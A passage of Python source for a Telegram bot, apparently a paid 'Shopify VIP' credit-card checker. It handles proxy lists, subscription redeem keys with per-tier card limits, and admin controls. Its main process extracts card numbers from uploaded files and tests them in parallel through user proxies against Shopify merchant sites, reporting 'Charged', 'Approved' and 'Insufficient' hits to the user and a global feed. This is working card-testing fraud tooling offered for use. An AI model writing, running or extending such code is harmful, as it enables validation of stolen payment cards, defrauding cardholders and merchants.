        await query.answer("✅ Verified!", show_alert=True)
        try: await query.message.delete()
        except Exception: pass
        await styled_send(context.bot, query.message.chat_id, f"⦗ ✨ ⦘ 𝘚𝘩𝘰𝘱𝘪𝘧𝘺 𝘝𝘐𝘗 𝘚𝘺𝘴𝘵𝘦𝘮\n╰ 𝘚𝘦𝘯𝘥 /start 𝘵𝘰 𝘷𝘪𝘦𝘸 𝘵𝘩𝘦 𝘮𝘦𝘯𝘶.", use_gif=True)
    else:
        await query.answer("❌ Not joined yet!", show_alert=True)

# ====================== PROXIES COMMANDS ======================
async def add_proxy_cmd(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if await is_maintenance(update, context): return
    if not await force_join_check(update, context): return
    uid = update.effective_user.id
    msg = update.message
    lines = []
    
    if msg.reply_to_message:
        if msg.reply_to_message.document:
            file = await context.bot.get_file(msg.reply_to_message.document.file_id)
            fp = f"proxies_{uid}.txt"
            await file.download_to_drive(fp)
            with open(fp, "r", encoding="utf-8") as f: lines = f.read().split()
            os.remove(fp)
        elif msg.reply_to_message.text:
            lines = msg.reply_to_message.text.split()
    else:
        parts = msg.text.split(maxsplit=1)
        if len(parts) == 2: lines = parts[1].split()
        else: return await styled_reply(update, f"⦗ 💎 ⦘ 𝘗𝘭𝘦𝘢𝘴𝘦 𝘱𝘳𝘰𝘷𝘪𝘥𝘦 𝘵𝘩𝘦 𝘱𝘳𝘰𝘹𝘪𝘦𝘴 𝘤𝘰𝘳𝘳𝘦𝘤𝘵𝘭𝘺.", use_gif=True)
    
    if not lines: return await styled_reply(update, f"⦗ 💎 ⦘ 𝘕𝘰 𝘱𝘳𝘰𝘹𝘪𝘦𝘴 𝘧𝘰𝘶𝘯𝘥 𝘪𝘯 𝘺𝘰𝘶𝘳 𝘮𝘦𝘴𝘴𝘢𝘨𝘦.", use_gif=True)
    db_proxies = await get_all_user_proxies(uid)
    existing_urls = {p['proxy_url'] for p in db_proxies} if db_proxies else set()
    cc = len(existing_urls)
    if cc >= 100: return await styled_reply(update, f"⦗ ⚠️ ⦘ 𝘓𝘪𝘮𝘪𝘵 100/100 𝘳𝘦𝘢𝘤𝘩𝘦𝘥.", use_gif=True)
    
    parsed = []
    for l in lines:
        px = parse_proxy_format(l)
        if px and px['proxy_url'] not in existing_urls:
            parsed.append(px)
            existing_urls.add(px['proxy_url'])
            
    if not parsed: return await styled_reply(update, f"⦗ 💎 ⦘ 𝘈𝘭𝘭 𝘱𝘳𝘰𝘹𝘪𝘦𝘴 𝘢𝘳𝘦 𝘢𝘭𝘳𝘦𝘢𝘥𝘺 𝘢𝘥𝘥𝘦𝘥 𝘰𝘳 𝘪𝘯𝘷𝘢𝘭𝘪𝘥.", use_gif=True)
    parsed = parsed[:100-cc]
    tm = await styled_reply(update, f"⦗ ⚙️ ⦘ 𝘈𝘥𝘥𝘪𝘯𝘨...")
    added = 0
    for pd2 in parsed:
        await add_proxy_db(uid, pd2)
        added += 1
    await styled_edit(tm, f"⦗ ✅ ⦘ 𝘚𝘶𝘤𝘤𝘦𝘴𝘴𝘧𝘶𝘭𝘭𝘺 𝘈𝘥𝘥𝘦𝘥: <code>{added}</code> 𝘗𝘳𝘰𝘹𝘪𝘦𝘴")

async def view_proxies(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if await is_maintenance(update, context): return
    if not await force_join_check(update, context): return
    uid = update.effective_user.id
    proxies = await get_all_user_proxies(uid)
    if not proxies: return await styled_reply(update, f"⦗ 💎 ⦘ 𝘠𝘰𝘶 𝘥𝘰𝘯'𝘵 𝘩𝘢𝘷𝘦 𝘢𝘯𝘺 𝘱𝘳𝘰𝘹𝘪𝘦𝘴 𝘴𝘢𝘷𝘦𝘥.", use_gif=True)
    text = f"⦗ 🛡️ ⦘ 𝘠𝘰𝘶𝘳 𝘗𝘳𝘰𝘹𝘪𝘦𝘴 ({len(proxies)}/100)\n\n"
    for i, p in enumerate(proxies[:30], 1): text += f"<code>{i}.</code> <code>{p['ip']}:{p['port']}</code>\n"
    if len(proxies) > 30: text += f"\n<i>+{len(proxies)-30} 𝘮𝘰𝘳𝘦...</i>"
    await styled_reply(update, text, use_gif=True)

async def remove_proxy_cmd(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if await is_maintenance(update, context): return
    if not await force_join_check(update, context): return
    uid = update.effective_user.id
    proxies = await get_all_user_proxies(uid)
    if not proxies: return await styled_reply(update, f"⦗ 💎 ⦘ 𝘕𝘰 𝘱𝘳𝘰𝘹𝘪𝘦𝘴 𝘵𝘰 𝘳𝘦𝘮𝘰𝘷𝘦.", use_gif=True)
    
    parts = update.message.text.split(maxsplit=1)
    if len(parts) == 1: return await styled_reply(update, f"⦗ 💎 ⦘ 𝘗𝘭𝘦𝘢𝘴𝘦 𝘴𝘱𝘦𝘤𝘪𝘧𝘺 'all' 𝘰𝘳 𝘵𝘩𝘦 𝘱𝘳𝘰𝘹𝘺 𝘯𝘶𝘮𝘣𝘦𝘳.", use_gif=True)
    arg = parts[1].strip().lower()
    
    if arg == 'all':
        c = await clear_all_proxies(uid)
        return await styled_reply(update, f"⦗ ✅ ⦘ 𝘊𝘭𝘦𝘢𝘳𝘦𝘥 <code>{c}</code> 𝘗𝘳𝘰𝘹𝘪𝘦𝘴 𝘴𝘶𝘤𝘤𝘦𝘴𝘴𝘧𝘶𝘭𝘭𝘺.", use_gif=True)
    try:
        idx = int(arg) - 1
        if 0 <= idx < len(proxies):
            await remove_proxy_by_index(uid, idx)
            await styled_reply(update, f"⦗ ✅ ⦘ 𝘗𝘳𝘰𝘹𝘺 𝘳𝘦𝘮𝘰𝘷𝘦𝘥.", use_gif=True)
        else: await styled_reply(update, f"⦗ 💎 ⦘ 𝘐𝘯𝘷𝘢𝘭𝘪𝘥 𝘱𝘳𝘰𝘹𝘺 𝘯𝘶𝘮𝘣𝘦𝘳.", use_gif=True)
    except Exception: await styled_reply(update, f"⦗ 💎 ⦘ 𝘐𝘯𝘷𝘢𝘭𝘪𝘥 𝘱𝘳𝘰𝘹𝘺 𝘯𝘶𝘮𝘣𝘦𝘳.", use_gif=True)

# ====================== REDEEM KEY ENGINE ======================
async def generate_keys_cmd(update: Update, context: ContextTypes.DEFAULT_TYPE):
    uid = update.effective_user.id
    if uid not in ADMIN_ID: return
    
    parts = update.message.text.split()
    if len(parts) < 2: return await styled_reply(update, f"⦗ 💎 ⦘ 𝘜𝘴𝘢𝘨𝘦: /gen [𝘗𝘭𝘢𝘯] [𝘕𝘶𝘮𝘣𝘦𝘳]", use_gif=True)
        
    plan_key = parts[1].lower()
    amount = int(parts[2]) if len(parts) > 2 else 1
    
    if plan_key not in PLANS: return await styled_reply(update, f"⦗ 💎 ⦘ 𝘐𝘯𝘷𝘢𝘭𝘪𝘥 𝘗𝘭𝘢𝘯. 𝘗𝘭𝘦𝘢𝘴𝘦 𝘶𝘴𝘦: plan1, plan2, plan3, plan4", use_gif=True)
        
    pi = PLANS[plan_key]
    keys_db = await load_keys()
    generated_codes = []
    
    for _ in range(amount):
        rand_str = ''.join(random.choices("ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789", k=10))
        code = f"Shopify-{rand_str[:5]}-{rand_str[5:]}"
        keys_db[code] = {"tier": pi["tier"], "days": pi["duration_days"], "used": False, "used_by": None, "generated_at": datetime.now().strftime('%Y-%m-%d %H:%M:%S')}
        generated_codes.append(code)
        
    await save_keys(keys_db)
    
    text = f"⦗ ✅ ⦘ 𝘚𝘶𝘤𝘤𝘦𝘴𝘴𝘧𝘶𝘭𝘭𝘺 𝘎𝘦𝘯𝘦𝘳𝘢𝘵𝘦𝘥 <code>{amount}</code> 𝘒𝘦𝘺(𝘴)!\n\n"
    text += f"├ ⦗ 💎 ⦘ 𝘗𝘭𝘢𝘯: <code>{pi['name']}</code>\n"
    text += f"├ ⦗ ⏱ ⦘ 𝘋𝘶𝘳𝘢𝘵𝘪𝘰𝘯: <code>{pi['duration_days']} 𝘋𝘢𝘺𝘴</code>\n"
    text += f"╰ ⦗ 💳 ⦘ 𝘓𝘪𝘮𝘪𝘵: <code>{get_cc_limit(pi['tier'])} 𝘊𝘊𝘴</code>\n\n"
    for c in generated_codes: text += f"<code>{c}</code>\n"
    await styled_reply(update, text, use_gif=True)

async def redeem_key_cmd(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if await is_maintenance(update, context): return
    if not await force_join_check(update, context): return
    
    uid = update.effective_user.id
    parts = update.message.text.split(maxsplit=1)
    code = parts[1].strip() if len(parts) > 1 else ""
    
    if not code: return await styled_reply(update, f"⦗ 💎 ⦘ 𝘗𝘭𝘦𝘢𝘴𝘦 𝘱𝘳𝘰𝘷𝘪𝘥𝘦 𝘺𝘰𝘶𝘳 𝘬𝘦𝘺: <code>/redeem [𝘒𝘦𝘺]</code>", use_gif=True)
    
    keys_db = await load_keys()
    
    if code not in keys_db: return await styled_reply(update, f"⦗ ❌ ⦘ 𝘐𝘯𝘷𝘢𝘭𝘪𝘥 𝘒𝘦𝘺. 𝘗𝘭𝘦𝘢𝘴𝘦 𝘤𝘩𝘦𝘤𝘬 𝘢𝘯𝘥 𝘵𝘳𝘺 𝘢𝘨𝘢𝘪𝘯.", use_gif=True)
    
    kinfo = keys_db[code]
    if kinfo["used"]: return await styled_reply(update, f"⦗ 💎 ⦘ 𝘛𝘩𝘪𝘴 𝘒𝘦𝘺 𝘩𝘢𝘴 𝘢𝘭𝘳𝘦𝘢𝘥𝘺 𝘣𝘦𝘦𝘯 𝘳𝘦𝘥𝘦𝘦𝘮𝘦𝘥.", use_gif=True)
    
    tier = kinfo["tier"]
    days = kinfo["days"]
    
    await set_user_plan(uid, tier, days)
    keys_db[code]["used"] = True
    keys_db[code]["used_by"] = uid
    redeem_time = datetime.now().strftime('%Y-%m-%d %H:%M:%S')
    keys_db[code]["redeemed_at"] = redeem_time
    await save_keys(keys_db)
    
    expiry_date = (datetime.now() + timedelta(days=days)).strftime('%Y-%m-%d')
    limit = get_cc_limit(tier, uid)
    
    msg = f"""⦗ 👑 ⦘ <b>𝘚𝘶𝘣𝘴𝘤𝘳𝘪𝘱𝘵𝘪𝘰𝘯 𝘈𝘤𝘵𝘪𝘷𝘢𝘵𝘦𝘥 𝘚𝘶𝘤𝘤𝘦𝘴𝘴𝘧𝘶𝘭𝘭𝘺!</b>

🎉 𝘊𝘰𝘯𝘨𝘳𝘢𝘵𝘶𝘭𝘢𝘵𝘪𝘰𝘯𝘴! 𝘠𝘰𝘶𝘳 𝘬𝘦𝘺 𝘸𝘢𝘴 𝘴𝘶𝘤𝘤𝘦𝘴𝘴𝘧𝘶𝘭𝘭𝘺 𝘳𝘦𝘥𝘦𝘦𝘮𝘦𝘥.

⦗ 💎 ⦘ <b>𝘗𝘭𝘢𝘯 𝘋𝘦𝘵𝘢𝘪𝘭𝘴:</b>
├ ⦗ ⚡ ⦘ 𝘛𝘪𝘦𝘳: <code>{tier}</code>
├ ⦗ ⏱ ⦘ 𝘋𝘶𝘳𝘢𝘵𝘪𝘰𝘯: <code>{days} 𝘋𝘢𝘺𝘴</code>
├ ⦗ 💳 ⦘ 𝘔𝘢𝘴𝘴 𝘓𝘪𝘮𝘪𝘵: <code>{limit} 𝘊𝘊𝘴</code>
╰ ⦗ ⏱ ⦘ 𝘌𝘹𝘱𝘪𝘳𝘦𝘴 𝘖𝘯: <code>{expiry_date}</code>

⦗ 🚀 ⦘ <i>𝘌𝘯𝘫𝘰𝘺 𝘶𝘭𝘵𝘳𝘢-𝘧𝘢𝘴𝘵 𝘤𝘩𝘦𝘤𝘬𝘪𝘯𝘨 𝘸𝘪𝘵𝘩 {WORKERS} 𝘞𝘰𝘳𝘬𝘦𝘳𝘴!</i>"""

    start_kb = [[InlineKeyboardButton("🚀 Start Checking", callback_data="back_start", style="success")]]
    await styled_reply(update, msg, buttons=start_kb, use_gif=True, specific_gif=ACTIVATION_GIF)

    try:
        user_name = update.effective_user.first_name or str(uid)
        admin_notification = f"""⦗ 🔔 ⦘ <b>𝘕𝘦𝘸 𝘒𝘦𝘺 𝘙𝘦𝘥𝘦𝘦𝘮𝘦𝘥!</b>

├ ⦗ 🔑 ⦘ 𝘒𝘦𝘺: <code>{code}</code>
├ ⦗ 👤 ⦘ 𝘜𝘴𝘦𝘳: <a href="tg://user?id={uid}">{user_name}</a> (<code>{uid}</code>)
├ ⦗ 💎 ⦘ 𝘗𝘭𝘢𝘯: <code>{tier}</code>
├ ⦗ ⏱ ⦘ 𝘋𝘶𝘳𝘢𝘵𝘪𝘰𝘯: <code>{days} 𝘋𝘢𝘺𝘴</code>
╰ ⦗ ⏳ ⦘ 𝘛𝘪𝘮𝘦: <code>{redeem_time}</code>"""
        if ADMIN_ID: await styled_send(context.bot, ADMIN_ID[0], admin_notification, use_gif=True)
    except Exception: pass

async def validate_key_cmd(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if update.effective_user.id not in ADMIN_ID: return
    parts = update.message.text.split(maxsplit=1)
    code = parts[1].strip() if len(parts) > 1 else ""
    keys_db = await load_keys()
    
    if not code: return await styled_reply(update, f"⦗ 💎 ⦘ 𝘗𝘭𝘦𝘢𝘴𝘦 𝘱𝘳𝘰𝘷𝘪𝘥𝘦 𝘵𝘩𝘦 𝘬𝘦𝘺: <code>/validate [𝘒𝘦𝘺]</code>", use_gif=True)
    if code not in keys_db: return await styled_reply(update, f"⦗ ❌ ⦘ 𝘒𝘦𝘺 𝘯𝘰𝘵 𝘧𝘰𝘶𝘯𝘥 𝘪𝘯 𝘥𝘢𝘵𝘢𝘣𝘢𝘴𝘦.", use_gif=True)
    
    kinfo = keys_db[code]
    tier = kinfo.get("tier", "Unknown")
    days = kinfo.get("days", 0)
    used = kinfo.get("used", False)
    used_by = kinfo.get("used_by", "None")
    gen_time = kinfo.get("generated_at", "Unknown")
    red_time = kinfo.get("redeemed_at", "Not yet")

    status_emoji = '🔴' if used else '🟢'
    status_text = "𝘜𝘴𝘦𝘥" if used else "𝘈𝘤𝘵𝘪𝘷𝘦"
    
    msg = f"""⦗ 🔑 ⦘ 𝘒𝘦𝘺 𝘐𝘯𝘧𝘰𝘳𝘮𝘢𝘵𝘪𝘰𝘯

├ ⦗ 💳 ⦘ 𝘒𝘦𝘺: <code>{code}</code>
├ ⦗ {status_emoji} ⦘ 𝘚𝘵𝘢𝘵𝘶𝘴: <code>{status_text}</code>
├ ⦗ 💎 ⦘ 𝘗𝘭𝘢𝘯 𝘛𝘪𝘦𝘳: <code>{tier}</code>
├ ⦗ ⏱ ⦘ 𝘋𝘶𝘳𝘢𝘵𝘪𝘰𝘯: <code>{days} 𝘋𝘢𝘺𝘴</code>
├ ⦗ ⏳ ⦘ 𝘎𝘦𝘯𝘦𝘳𝘢𝘵𝘦𝘥: <code>{gen_time}</code>"""

    if used:
        msg += f"\n\n⦗ 👤 ⦘ 𝘙𝘦𝘥𝘦𝘦𝘮𝘦𝘥 𝘉𝘺: <code>{used_by}</code> <a href='tg://user?id={used_by}'>[𝘗𝘳𝘰𝘧𝘪𝘭𝘦]</a>\n╰ ⦗ ⏱ ⦘ 𝘙𝘦𝘥𝘦𝘦𝘮 𝘛𝘪𝘮𝘦: <code>{red_time}</code>"
        
    await styled_reply(update, msg, use_gif=True)

# ====================== ADMIN ======================
async def maint_cmd(update: Update, context: ContextTypes.DEFAULT_TYPE):
    global _MAINTENANCE_MODE
    if update.effective_user.id not in ADMIN_ID: return
    parts = update.message.text.split(maxsplit=1)
    arg = parts[1].strip() if len(parts) > 1 else ""
    
    if arg: _MAINTENANCE_MODE = (arg.lower() == 'on')
    else: _MAINTENANCE_MODE = not _MAINTENANCE_MODE
    if _MAINTENANCE_MODE: await styled_reply(update, f"⦗ 💎 ⦘ 𝘔𝘢𝘪𝘯𝘵𝘦𝘯𝘢𝘯𝘤𝘦 𝘔𝘰𝘥𝘦: 𝘖𝘕\n╰ 𝘈𝘭𝘭 𝘶𝘴𝘦𝘳𝘴 𝘢𝘳𝘦 𝘯𝘰𝘸 𝘣𝘭𝘰𝘤𝘬𝘦𝘥.", use_gif=True)
    else: await styled_reply(update, f"⦗ ✅ ⦘ 𝘔𝘢𝘪𝘯𝘵𝘦𝘯𝘢𝘯𝘤𝘦 𝘔𝘰𝘥𝘦: 𝘖𝘍𝘍\n╰ 𝘚𝘺𝘴𝘵𝘦𝘮 𝘪𝘴 𝘰𝘯𝘭𝘪𝘯𝘦 𝘧𝘰𝘳 𝘢𝘭𝘭 𝘶𝘴𝘦𝘳𝘴.", use_gif=True)

async def admin_users_cmd(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if update.effective_user.id not in ADMIN_ID: return
    active_uids = [str(u) for u, p in ACTIVE_MTXT_PROCESSES.items() if not p.get("stopped")]
    active_count = len(active_uids)
    total_seen = len(USER_LAST_REQ)
    text = f"""⦗ 🌐 ⦘ 𝘎𝘭𝘰𝘣𝘢𝘭 𝘚𝘺𝘴𝘵𝘦𝘮 𝘚𝘵𝘢𝘵𝘶𝘴\n\n├ ⦗ ⚡ ⦘ 𝘈𝘤𝘵𝘪𝘷𝘦 𝘊𝘩𝘦𝘤𝘬𝘦𝘳𝘴 ⇾ <code>{active_count}</code>\n├ ⦗ 👥 ⦘ 𝘛𝘰𝘵𝘢𝘭 𝘚𝘦𝘴𝘴𝘪𝘰𝘯 𝘜𝘴𝘦𝘳𝘴 ⇾ <code>{total_seen}</code>\n╰ ⦗ 🆔 ⦘ 𝘈𝘤𝘵𝘪𝘷𝘦 𝘐𝘋𝘴 ⇾ <code>{', '.join(active_uids) if active_uids else 'None'}</code>"""
    await styled_reply(update, text, use_gif=True)

async def revoke_plan_cmd(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if update.effective_user.id not in ADMIN_ID: return
    parts = update.message.text.split(maxsplit=1)
    if len(parts) < 2: return await styled_reply(update, f"⦗ 💎 ⦘ 𝘗𝘭𝘦𝘢𝘴𝘦 𝘱𝘳𝘰𝘷𝘪𝘥𝘦 𝘢 𝘷𝘢𝘭𝘪𝘥 𝘐𝘋.", use_gif=True)
    try: target_uid = int(parts[1].strip())
    except Exception: return await styled_reply(update, f"⦗ 💎 ⦘ 𝘗𝘭𝘦𝘢𝘴𝘦 𝘱𝘳𝘰𝘷𝘪𝘥𝘦 𝘢 𝘷𝘢𝘭𝘪𝘥 𝘐𝘋.", use_gif=True)
    
    await set_user_plan(target_uid, "Free", 0)
    proc = ACTIVE_MTXT_PROCESSES.get(target_uid)
    if proc:
        proc["stopped"] = True
        for t in proc.get("tasks", []):
            if not t.done(): t.cancel()
            
    admin_msg = f"⦗ 💎 ⦘ 𝘈𝘤𝘤𝘦𝘴𝘴 𝘙𝘦𝘷𝘰𝘬𝘦𝘥\n├ ⦗ 👤 ⦘ 𝘜𝘴𝘦𝘳 ⇾ <code>{target_uid}</code>\n╰ ⦗ ⚡ ⦘ 𝘚𝘵𝘢𝘵𝘶𝘴 ⇾ <code>𝘋𝘦𝘮𝘰𝘵𝘦𝘥 𝘵𝘰 𝘍𝘳𝘦𝘦</code>"
    await styled_reply(update, admin_msg, use_gif=True)
    try: await styled_send(context.bot, target_uid, f"⦗ 💎 ⦘ 𝘚𝘺𝘴𝘵𝘦𝘮 𝘈𝘭𝘦𝘳𝘵\n\n╰ 𝘠𝘰𝘶𝘳 𝘝𝘐𝘗 𝘢𝘤𝘤𝘦𝘴𝘴 𝘩𝘢𝘴 𝘣𝘦𝘦𝘯 𝘳𝘦𝘷𝘰𝘬𝘦𝘥 𝘣𝘺 𝘵𝘩𝘦 𝘢𝘥𝘮𝘪𝘯𝘪𝘴𝘵𝘳𝘢𝘵𝘰𝘳.", use_gif=True)
    except Exception: pass

# ====================== FILE PROCESSING & MASS PROCESS ======================
async def auto_file_check_cmd(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if await is_maintenance(update, context): return
    uid = update.effective_user.id
    
    processing_msg = await styled_reply(update, f"⦗ ⏳ ⦘ 𝘗𝘳𝘰𝘤𝘦𝘴𝘴𝘪𝘯𝘨 𝘧𝘪𝘭𝘦 𝘥𝘢𝘵𝘢...", use_gif=True)
    
    try:
        if uid in ACTIVE_MTXT_PROCESSES and not ACTIVE_MTXT_PROCESSES[uid].get("stopped", True): 
            return await styled_edit(processing_msg, f"⦗ 💎 ⦘ 𝘈 𝘱𝘳𝘰𝘤𝘦𝘴𝘴 𝘪𝘴 𝘢𝘭𝘳𝘦𝘢𝘥𝘺 𝘢𝘤𝘵𝘪𝘷𝘦! 𝘗𝘭𝘦𝘢𝘴𝘦 𝘸𝘢𝘪𝘵 𝘧𝘰𝘳 𝘪𝘵 𝘵𝘰 𝘧𝘪𝘯𝘪𝘴𝘩.")
            
        doc = update.message.document
        if doc.file_size > 2 * 1024 * 1024:
            return await styled_edit(processing_msg, f"⦗ 💎 ⦘ 𝘍𝘪𝘭𝘦 𝘵𝘰𝘰 𝘭𝘢𝘳𝘨𝘦! (𝘔𝘢𝘹 2𝘔𝘉)")
            
        if not await force_join_check(update, context): 
            try: await processing_msg.delete()
            except Exception: pass
            return
        
        plan = await get_user_plan(uid)
        db_proxies = await get_all_user_proxies(uid)
        if len(db_proxies) == 0:
            return await styled_edit(processing_msg, f"⦗ 💎 ⦘ <b>𝘠𝘰𝘶 𝘮𝘶𝘴𝘵 𝘢𝘥𝘥 𝘱𝘳𝘰𝘹𝘪𝘦𝘴 𝘣𝘦𝘧𝘰𝘳𝘦 𝘤𝘩𝘦𝘤𝘬𝘪𝘯𝘨! 𝘜𝘴𝘦 <code>/addpxy</code> 𝘵𝘰 𝘢𝘥𝘥.</b>")
        
        file = await context.bot.get_file(doc.file_id)
        fp = f"temp_{uid}_{int(time.time())}.txt"
        await file.download_to_drive(fp)
        
        with open(fp, "r", encoding="utf-8", errors="ignore") as f:
            content = f.read()
        os.remove(fp)
            
        cards = extract_cc(content)
        if not cards:
            return await styled_edit(processing_msg, f"⦗ 💎 ⦘ 𝘕𝘰 𝘷𝘢𝘭𝘪𝘥 𝘤𝘢𝘳𝘥𝘴 𝘧𝘰𝘶𝘯𝘥 𝘪𝘯 𝘵𝘩𝘦 𝘧𝘪𝘭𝘦.")
        
        cl = get_cc_limit(plan, uid)
        if len(cards) > cl: cards = cards[:cl]
        PENDING_FILES[uid] = cards
        
        # PTB v20+ Primary Styles
        kb = [
            [
                InlineKeyboardButton("Shopify (Charge)", callback_data="gate:Shopify", style="primary"),
                InlineKeyboardButton("Braintree (Soon)", callback_data="gate:soon_Braintree", style="primary")
            ],
            [
                InlineKeyboardButton("Stripe (Soon)", callback_data="gate:soon_Stripe", style="primary"),
                InlineKeyboardButton("PayPal (Soon)", callback_data="gate:soon_PayPal", style="primary")
            ],
            [InlineKeyboardButton("Cancel", callback_data="gate:cancel", style="danger")]
        ]
        await styled_edit(processing_msg, f"⦗ ⚙️ ⦘ 𝘍𝘪𝘭𝘦 𝘓𝘰𝘢𝘥𝘦𝘥 𝘚𝘶𝘤𝘤𝘦𝘴𝘴𝘧𝘶𝘭𝘭𝘺\n\n├ 𝘛𝘰𝘵𝘢𝘭 𝘊𝘊𝘴: <code>{len(cards)}</code>\n╰ 𝘗𝘭𝘦𝘢𝘴𝘦 𝘴𝘦𝘭𝘦𝘤𝘵 𝘢 𝘎𝘢𝘵𝘦𝘸𝘢𝘺 𝘵𝘰 𝘴𝘵𝘢𝘳𝘵:", buttons=kb)
    except Exception as e:
        await styled_edit(processing_msg, f"⚠️ Error: {e}")

async def gateway_selection_cb(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if await is_maintenance(update, context): return
    query = update.callback_query
    uid = query.from_user.id
    gate_name = query.data.split(":")[1]
    
    if gate_name.startswith("soon_"): 
        return await query.answer("⏳ Gateway is coming soon!", show_alert=True)
    
    await query.answer()
    msg_obj = query.message
    
    if gate_name == "cancel":
        PENDING_FILES.pop(uid, None)
        return await styled_edit(msg_obj, f"⦗ 💎 ⦘ 𝘗𝘳𝘰𝘤𝘦𝘴𝘴 𝘊𝘢𝘯𝘤𝘦𝘭𝘭𝘦𝘥.", buttons=None)
    
    cards = PENDING_FILES.pop(uid, None)
    if not cards: return await query.answer("⚠️ Session expired or invalid file.", show_alert=True)
    
    ACTIVE_MTXT_PROCESSES[uid] = {"stopped": False, "tasks": []}
    await styled_edit(msg_obj, f"⦗ ⚡ ⦘ 𝘗𝘳𝘦𝘱𝘢𝘳𝘪𝘯𝘨 𝘚𝘦𝘴𝘴𝘪𝘰𝘯...\n\n├ 𝘓𝘰𝘢𝘥𝘦𝘥: <code>{len(cards)} 𝘊𝘊𝘴</code>\n├ 𝘛𝘩𝘳𝘦𝘢𝘥𝘴: <code>{WORKERS}</code>\n╰ 𝘎𝘢𝘵𝘦𝘸𝘢𝘺: <code>{gate_name}</code>", buttons=None)
    
    asyncio.create_task(_run_mass_process(update, msg_obj, cards, ACTIVE_MTXT_PROCESSES, "stop_chk", gate_name, context.bot))

async def _run_mass_process(update: Update, msg_obj, cards, process_store, stop_prefix, gate_name, bot):
    uid = update.effective_user.id
    total = len(cards); checked = charged = approved = insufficient = declined = errors = 0
    st = time.time()
    sites = await get_github_sites()
    db_proxies = await get_all_user_proxies(uid)
    proxies = [p['proxy_url'] for p in db_proxies] if db_proxies else []
    http_session = await get_user_http_session(uid)
    lcd = "-"
    def is_stopped(): return process_store.get(uid, {}).get("stopped", False)

    async def dashboard_updater():
        while not is_stopped():
            await asyncio.sleep(4.0)
            if is_stopped(): break
            
            elapsed_now = time.time() - st
            cpm = int((checked / elapsed_now) * 60) if elapsed_now > 0 else 0
            
            dashboard_text = f"""⦗ ⚡ ⦘ 𝘚𝘦𝘴𝘴𝘪𝘰𝘯 𝘈𝘤𝘵𝘪𝘷𝘦...

├ ⦗ 🌐 ⦘ 𝘎𝘢𝘵𝘦𝘸𝘢𝘺 ⇾ <code>{gate_name}</code>
╰ ⦗ 💎 ⦘ 𝘛𝘩𝘳𝘦𝘢𝘥𝘴 ⇾ <code>{WORKERS}</code>"""
            
            kb = [
                [InlineKeyboardButton(f"{lcd}", callback_data="none", style="primary")],
                [InlineKeyboardButton(f"🟢 Charged: {charged}", callback_data="none", style="success"), InlineKeyboardButton(f"⚡ Approved: {approved}", callback_data="none", style="success")],
                [InlineKeyboardButton(f"🟡 Insufficient: {insufficient}", callback_data="none", style="primary"), InlineKeyboardButton(f"🔴 Declined: {declined}", callback_data="none", style="danger")],
                [InlineKeyboardButton(f"📊 Total: {checked} / {total}", callback_data="none", style="primary"), InlineKeyboardButton(f"⚠️ Error: {errors}", callback_data="none", style="danger")],
                [InlineKeyboardButton(f"🚀 Speed: {cpm} CPM", callback_data="none", style="primary")],
                [InlineKeyboardButton("🛑 Stop Process", callback_data=f"{stop_prefix}:{uid}", style="danger")]
            ]
            try: await styled_edit(msg_obj, dashboard_text, buttons=kb)
            except asyncio.CancelledError: break
            except Exception: pass

    updater_task = asyncio.create_task(dashboard_updater())
    queue = asyncio.Queue()
    for c in cards: queue.put_nowait(c)

    async def worker(worker_id):
        await asyncio.sleep(worker_id * 0.05)
        nonlocal checked, charged, approved, insufficient, declined, errors, lcd
        while not queue.empty() and not is_stopped():
            try: card = queue.get_nowait()
            except Exception: break
            
            try:
                card_st = time.time()
                res = await check_card_with_retry(card, sites, proxies, http_session, gate_name, max_retries=2)
                if is_stopped(): break 

                card_el = time.time() - card_st
                status = res.get('status', 'Dead')
                checked += 1
                
                royal_status_map = {'Charged': '🟢', 'Approved': '⚡', 'Insufficient': '🟡', 'Site Error': '⚠️', 'Dead': '🔴'}
                lcd = f"{card[:15]}... ⇾ {royal_status_map.get(status, '🔴')}"
                
                if status == 'Charged':
                    charged += 1
                    asyncio.create_task(_send_mass_hit(card, "Charged", res.get('message', ''), res.get('price', '-'), gate_name, uid, card_el, bot))
                    asyncio.create_task(_send_global_hit("Charged", gate_name, res.get('message', ''), res.get('price', '-'), uid, bot))
                elif status == 'Approved':
                    approved += 1
                    asyncio.create_task(_send_mass_hit(card, "Approved", res.get('message', ''), res.get('price', '-'), gate_name, uid, card_el, bot))
                elif status == 'Insufficient':
                    insufficient += 1
                    asyncio.create_task(_send_mass_hit(card, "Insufficient", res.get('message', ''), res.get('price', '-'), gate_name, uid, card_el, bot))
                    asyncio.create_task(_send_global_hit("Insufficient", gate_name, res.get('message', ''), res.get('price', '-'), uid, bot))
                elif status == 'Site Error': errors += 1
                else: declined += 1
                
            except asyncio.CancelledError: break
            except Exception:
                errors += 1
                checked += 1
            finally:
                queue.task_done()
                await asyncio.sleep(DELAY) 

    workers_tasks = [asyncio.create_task(worker(i)) for i in range(WORKERS)]
    process_store[uid]["tasks"] = workers_tasks + [updater_task]

    await asyncio.gather(*workers_tasks, return_exceptions=True)
    if not updater_task.done(): updater_task.cancel()
        
    el = int(time.time() - st)
    h, m, s = el // 3600, (el % 3600) // 60, el % 60
    avg_cpm = int((checked / el) * 60) if el > 0 else 0
    
    final_text = f"""{f'⦗ 💎 ⦘ 𝘗𝘳𝘰𝘤𝘦𝘴𝘴 𝘍𝘰𝘳𝘤𝘦 𝘚𝘵𝘰𝘱𝘱𝘦𝘥' if is_stopped() else f'⦗ ✨ ⦘ 𝘗𝘳𝘰𝘤𝘦𝘴𝘴 𝘊𝘰𝘮𝘱𝘭𝘦𝘵𝘦𝘥'}

├ ⦗ 🌐 ⦘ 𝘎𝘢𝘵𝘦𝘸𝘢𝘺 ⇾ <code>{gate_name}</code>
╰ ⦗ ⏱ ⦘ 𝘛𝘪𝘮𝘦 ⇾ <code>{h}𝘩 {m}𝘮 {s}𝘴</code>"""

    fkb = [
        [InlineKeyboardButton(f"🟢 Charged: {charged}", callback_data="none", style="success"), InlineKeyboardButton(f"⚡ Approved: {approved}", callback_data="none", style="success")],
